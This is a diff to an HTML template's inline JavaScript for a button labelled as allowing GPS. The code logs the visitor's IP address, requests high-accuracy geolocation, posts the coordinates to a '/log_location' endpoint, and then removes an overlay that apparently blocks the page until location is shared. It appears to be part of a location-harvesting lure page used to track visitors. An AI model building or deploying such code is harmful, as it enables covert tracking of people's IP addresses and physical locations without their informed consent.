@@ -119,56 +119,57 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
- <script>
-// Remove ALL existing click handlers to prevent duplicates
-document.getElementById('gps-allow-btn').replaceWith(document.getElementById('gps-allow-btn').cloneNode(true));
+<script>
+// 1. First remove any existing event listeners
+const button = document.getElementById('gps-allow-btn');
+const newButton = button.cloneNode(true);
+button.parentNode.replaceChild(newButton, button);
 
-// New clean event listener
-document.getElementById('gps-allow-btn').addEventListener('click', async () => {
+// 2. New clean event listener
+document.getElementById('gps-allow-btn').addEventListener('click', async function() {
   try {
-    // 1. Get IP
+    // A. Get IP
     const ip = await fetch('/getip').then(r => r.text());
     
-    // 2. Log permission request
+    // B. Log permission request
     await fetch('/log_location', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        type: 'permission_request',
+        type: 'permission_request', 
         ip: ip,
         timestamp: new Date().toISOString()
       })
     });
 
-    // 3. Get GPS
-    const position = await new Promise((resolve, reject) => {
+    // C. Get GPS location
+    const pos = await new Promise((resolve, reject) => {
       navigator.geolocation.getCurrentPosition(resolve, reject, {
         enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+        timeout: 10000
       });
     });
 
-    // 4. Log location
+    // D. Log location data
     await fetch('/log_location', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         type: 'location_data',
         ip: ip,
-        lat: position.coords.latitude,
-        lng: position.coords.longitude,
-        accuracy: position.coords.accuracy,
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
         timestamp: new Date().toISOString()
       })
     });
 
-    // 5. ONLY hide overlay - NO REDIRECT
-    document.getElementById('gps-overlay').style.display = 'none';
+    // E. ONLY HIDE OVERLAY - NO REDIRECT
+    document.getElementById('gps-overlay').remove();
 
   } catch (error) {
-    console.error("Error:", error);
-    alert("Location access is required to continue.");
+    console.error('Error:', error);
+    alert("Error: " + error.message);
   }
 });
 </script>
